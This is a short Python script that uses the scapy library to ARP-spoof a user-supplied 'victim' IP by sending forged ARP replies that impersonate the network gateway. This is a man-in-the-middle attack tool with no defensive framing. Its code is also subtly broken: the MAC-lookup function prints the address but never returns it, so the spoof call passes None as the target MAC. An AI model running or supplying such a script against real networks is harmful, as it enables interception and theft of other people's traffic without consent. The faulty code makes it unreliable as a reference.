import scapy.all as scapy

victim = input("Enter victim IP address: ")
gateway = input("Enter gateway IP address: ")

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=True)[0]

    print(answered_list[0][1].hwsrc)

def spoof(victim_ip, gateway_ip):
    target_mac = get_mac(victim_ip)
    packet = scapy.ARP(op=2, pdst=victim_ip, hwdst=target_mac, psrc=gateway_ip)
    scapy.send(packet)

    print(f'[+] ARP response sent to {victim_ip}, spoofing {gateway_ip}')

spoof(victim, gateway)
#get_mac(victim)